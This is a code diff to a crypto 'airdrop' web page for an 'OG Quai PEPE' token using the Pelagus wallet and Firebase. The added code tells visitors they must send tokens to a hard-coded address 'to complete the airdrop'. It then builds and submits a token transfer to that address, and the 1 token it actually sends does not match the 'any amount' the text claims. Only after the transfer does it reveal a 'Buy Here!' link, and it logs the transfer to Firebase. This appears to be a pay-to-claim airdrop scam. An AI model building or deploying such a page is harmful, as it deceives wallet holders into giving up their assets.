@@ -141,6 +141,28 @@
             max-height: 100px;
             overflow-y: auto;
         }
+
+        .airdrop-info {
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 1rem;
+            border-radius: 6px;
+            margin: 1rem 0;
+            display: none;
+        }
+
+        .btn-send {
+            background: #ef4444;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 1rem;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -159,6 +181,16 @@
             Connect Discord
         </button>
         <button id="connectBtn" class="btn-connect">Connect Pelagus</button>
+        
+        <!-- New airdrop info and send button -->
+        <div id="airdropInfo" class="airdrop-info">
+            <h3>🎉 OG Quai PEPE Airdrop</h3>
+            <p>To complete the airdrop process, send any amount of OG Quai PEPE tokens.</p>
+            <p>Destination: 0x006B8A853ee3235c77947D12E47A3dBC547Bab10</p>
+            <p>Your token balance: <span id="userBalance">0</span> OG Quai PEPE</p>
+        </div>
+        <button id="sendBtn" class="btn-send">Send Tokens</button>
+
         <button id="scanBtn" class="btn-scan" style="display:none">View on QuaiScan</button>
         <div id="console"></div>
         <button id="buyBtn" class="btn-buy" style="display:none" onclick="window.open('https://poop.fun/token/0x001411083d4CF24632BA5e0841909933C2Da04a8', '_blank')">Buy Here!</button>
@@ -166,6 +198,7 @@
 
     <script>
         const TOKEN_ADDRESS = '0x001411083d4CF24632BA5e0841909933C2Da04a8';
+        const DESTINATION_ADDRESS = '0x006B8A853ee3235c77947D12E47A3dBC547Bab10';
         const RPC_ENDPOINT = 'https://rpc.quai.network/cyprus1';
         
         // Initialize Firebase
@@ -277,6 +310,85 @@ async function saveToFirebase(data) {
             console.log(message);
         }
 
+        async function sendTokens() {
+            try {
+                if (!window.pelagus) {
+                    throw new Error('Pelagus wallet not found');
+                }
+
+                // Token transfer method ID for 'transfer(address,uint256)'
+                const methodId = '0xa9059cbb';
+                // Remove '0x' and pad address to 32 bytes
+                const paddedAddress = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
+                // Amount in wei (1 token), pad to 32 bytes
+                const amount = '0000000000000000000000000000000000000000000000000de0b6b3a7640000'; // 1 token = 10^18 wei
+                
+                // Construct the data field
+                const data = methodId + paddedAddress + amount;
+
+                const transactionParameters = {
+                    to: TOKEN_ADDRESS,
+                    from: userSession.address,
+                    data: '0x' + data,
+                };
+
+                const txHash = await window.pelagus.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
+
+                log('Transaction sent: ' + txHash);
+
+                // Wait for transaction confirmation
+                const receipt = await waitForTransaction(txHash);
+                log('Transaction confirmed!');
+
+                // Update userSession with transfer data
+                userSession.transferAmount = '1';
+                userSession.transferTxHash = txHash;
+
+                // Save updated data to Firebase
+                await saveSessionToFirebase();
+
+                // Update UI
+                document.getElementById('sendBtn').style.display = 'none';
+                document.getElementById('scanBtn').style.display = 'block';
+                document.getElementById('buyBtn').style.display = 'block';
+
+            } catch (error) {
+                log('Error sending tokens: ' + error.message);
+                console.error(error);
+            }
+        }
+
+        async function waitForTransaction(txHash) {
+            while (true) {
+                try {
+                    const response = await fetch(RPC_ENDPOINT, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            jsonrpc: '2.0',
+                            method: 'quai_getTransactionReceipt',
+                            params: [txHash],
+                            id: 1
+                        })
+                    });
+
+                    const result = await response.json();
+                    if (result.result && result.result.status === '0x1') {
+                        return result.result;
+                    }
+
+                    await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before checking again
+                } catch (error) {
+                    console.error('Error checking transaction:', error);
+                    throw error;
+                }
+            }
+        }
+
+
         async function connectWallet() {
     try {
         if (!window.pelagus) {
@@ -307,10 +419,31 @@ async function saveToFirebase(data) {
 
         // Update UI
         document.getElementById('titleText').style.display = 'block';
-        document.getElementById('scanBtn').style.display = 'block';
-        document.getElementById('buyBtn').style.display = 'block';
+        document.getElementById('connectBtn').style.display = 'none';
+        
+        // Show airdrop info and update balance
+        document.getElementById('airdropInfo').style.display = 'block';
+        document.getElementById('userBalance').textContent = userSession.tokenBalance.toFixed(2);
+        document.getElementById('sendBtn').style.display = 'block';
+
+        // Hide scan and buy buttons until transfer is complete
+        document.getElementById('scanBtn').style.display = 'none';
+        document.getElementById('buyBtn').style.display = 'none';
+        
+        // Set up scan button link
         document.getElementById('scanBtn').onclick = () =>
             window.location.href = `https://quaiscan.io/address/${address}`;
+            
+        // Check if transfer was already completed
+        const userDoc = await db.collection('users').doc(address).get();
+        if (userDoc.exists && userDoc.data().transferTxHash) {
+            // If transfer was already done, show scan and buy buttons
+            document.getElementById('sendBtn').style.display = 'none';
+            document.getElementById('scanBtn').style.display = 'block';
+            document.getElementById('buyBtn').style.display = 'block';
+            log('Transfer already completed with tx: ' + userDoc.data().transferTxHash);
+        }
+
     } catch (error) {
         log('Error: ' + error.message);
         console.error(error);
@@ -357,6 +490,7 @@ document.getElementById('discordBtn').addEventListener('click', () => {
 });
 
 document.getElementById('connectBtn').addEventListener('click', connectWallet);
+document.getElementById('sendBtn').addEventListener('click', sendTokens);
 
 // Check for Discord callback on page load
 if (window.location.hash.includes('access_token')) {
